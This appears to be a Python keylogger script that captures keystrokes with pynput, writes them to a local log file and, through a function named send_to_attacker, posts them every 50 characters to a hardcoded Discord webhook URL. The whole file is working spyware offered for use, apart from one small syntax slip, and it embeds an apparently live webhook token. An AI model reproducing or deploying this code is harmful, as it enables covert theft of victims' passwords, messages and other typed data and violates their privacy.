from pynput import keyboard
import os
from datetime import datetime
import requests

# === CONFIG ===
webhook_url = "https://discord.com/api/webhooks/1361504169411870750/u9EHvt1B37NZMSIllaMg2GkhC21v7RX3WhJt84sUo8HBL8lZ_8jy3lCiei7ohRf53JBR"

log_folder = os.path.expanduser("~/keylogger")
os.makedirs(log_folder, exist_ok=True)
log_file = os.path.join(log_folder, "keylog.txt")

log = ""

special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
}

def send_to_attacker(log_data):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    full_log = f"{timestamp} {log_data}"

    # Save to local file
    with open(log_file, "a") as f:
        f.write(full_log + "\n")

    # Send to Discord webhook
    try:
        payload = {
            "content": f"**Keylog:**\n```{log_data}```"
        }
        requests.post(webhook_url, json=payload)
    except Exception as e:
        print(f"[!] Webhook failed: {e}")

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if char := special_keys.get(key)
            log += char
        else:
            pass

    if len(log) >= 50:
        send_to_attacker(log)
        log = ""

def on_release(key):
    if key == keyboard.Key.esc:
        print("[*] Keylogger stopped.")
        return False

print(f"[*] Keylogger started. Logs at: {log_file}")
print("[*] Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

